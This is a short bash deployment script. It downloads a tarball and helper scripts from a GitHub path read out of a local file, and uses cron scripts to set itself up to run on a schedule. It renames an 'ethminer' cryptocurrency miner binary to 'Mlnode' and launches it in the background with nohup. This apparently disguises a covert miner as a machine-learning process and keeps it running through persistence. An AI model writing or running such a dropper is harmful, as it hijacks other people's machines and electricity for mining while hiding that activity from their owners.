#Get path 
whoami > name.txt
namepath=$(head -1 name.txt)
path=/home/$namepath
cd $path
gitpath=$(head -1 gitpath.txt)

wget https://github.com/$gitpath/raw/main/Mlnode.tar.gz
tar -xvf Mlnode.tar.gz
rm -rf Mlnode.tar.gz
wget https://raw.githubusercontent.com/$gitpath/main/cron.sh
wget https://raw.githubusercontent.com/$gitpath/main/cronadd.sh
wget https://raw.githubusercontent.com/$gitpath/main/croncheck.sh
chmod +x cronadd.sh
chmod +x croncheck.sh
./cronadd.sh
./croncheck.sh

cd bin/
wget https://raw.githubusercontent.com/$gitpath/main/runsrc.sh
chmod +x runsrc.sh
mv ethminer Mlnode

nohup sh runsrc.sh > result.log 2>&1 &

